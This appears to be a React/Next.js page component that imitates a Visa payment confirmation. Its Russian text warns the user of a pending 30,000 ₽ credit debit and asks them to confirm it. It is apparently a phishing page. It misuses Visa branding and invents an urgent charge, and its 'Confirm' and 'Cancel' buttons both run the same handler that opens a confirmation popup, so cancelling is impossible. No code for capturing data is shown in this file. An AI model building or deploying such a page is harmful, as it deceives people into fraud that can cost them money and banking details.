"use client";

import { VisaLogoIcon } from "@/assets/icons";
import Lottie from "lottie-react";
import visacard from "../../assets/visaCard.json";
import Checkbox from "@/components/checkbox";
import { useState } from "react";
import Confirmingpopup from "@/components/confirmingpopup";

export default function HomePage({}) {
  let [isConfirmClicked, setIsConfirmClicked] = useState<boolean>(false);
  const confirmButtonHandler = (): void => {
    setIsConfirmClicked(true);
  };

  return (
    <>
      <div>
        <div className="w-full h-[50px] relative flex justify-center items-centr shadow-[0_4px_6px_rgba(0,0,0,0.2)] overflow-hidden z-1">
          <div className="absolute top-[-45px] w-[200px] h-[145px]">
            <VisaLogoIcon />
          </div>
        </div>
        <div className="w-[350px] absolute top-[100px] left-1/2 -translate-x-1/2 z-2 ">
          <p className="text-[28px] font-medium text-center text-[#1A1F71]">
            Complete the credit order
          </p>
        </div>
        <div className="mt-[80px]">
          <Lottie animationData={visacard} loop={true} />
        </div>
        <div>
          <p className="font-300 text-[16px] text-[#2c2c2c] px-[25px] relative  z-10 mt-[-40px]">
            На ваш банковский счёт был отправлен запрос на проведение операции -
            списание кредита на сумму{" "}
            <span className="font-medium text-[#1434cb]">30 000 ₽</span>.
            Пожалуйста, подтвердите действие, если оно выполнено вами.
          </p>
        </div>
        <div>
          <div className="mt-[30px]">
            <div className="w-full flex items-center gap-x-[10px] px-[25px] ">
              <Checkbox />
              <p className="text-[#000000] opacity-[67%] text-sm">
                I agree to the Terms and Conditions
              </p>
            </div>
            <div className="w-full flex items-center gap-x-[10px] px-[25px] mt-[5px]">
              <Checkbox />
              <p className="text-[#000000] opacity-[67%] text-sm">
                Remember my choice
              </p>
            </div>
          </div>
        </div>
        <div className="flex justify-between gap-4 mt-6 px-[25px]">
          <button
            className="w-[160px] px-6 py-2 rounded-lg border border-[#1A1F71] text-[#1A1F71] text-lg font-medium hover:bg-[#E1E6F9] transition"
            onClick={confirmButtonHandler}
          >
            Подтвердить
          </button>
          <button className="w-[160px] px-6 py-2 rounded-lg bg-[#1A1F71] text-white text-lg font-medium hover:bg-[#142688] transition"
           onClick={confirmButtonHandler}>
            Отменить
          </button>
        </div>
      </div>
      {isConfirmClicked && <Confirmingpopup />}
    </>
  );
}
